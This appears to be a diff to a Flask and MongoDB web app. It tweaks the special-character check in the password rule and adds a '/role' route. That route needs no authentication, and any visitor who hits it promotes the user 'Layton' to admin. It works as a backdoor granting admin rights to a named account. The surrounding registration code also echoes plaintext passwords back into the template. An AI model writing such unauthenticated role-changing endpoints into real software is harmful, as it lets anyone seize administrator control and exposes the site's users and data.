@@ -55,7 +55,7 @@ def register():
         elif not re.search("[A-Z]", password):
             flash("password must have capital letters!",'error')
             return render_template('register.html',username=username,email=email,password=password,confirm_password=confirm_password)
-        elif not re.search("[_@$!]+", password):
+        elif not re.search("[_@&$!]+", password):
             flash("Password must contain special characters!",'error')
             return render_template('register.html',username=username,email=email,password=password,confirm_password=confirm_password)
         else:
@@ -229,6 +229,11 @@ def admin():
     contacts=list(mongo.db.contact.find())
     return render_template('admin.html',contacts=contacts)
 
+
+@app.route('/role')
+def changeRole():
+    admin=mongo.db.users.update_one({"username":"Layton"},{"$set":{"role":"admin"}})
+    return "Role changed successfully"
 
 @app.route('/logout')
 def logout():
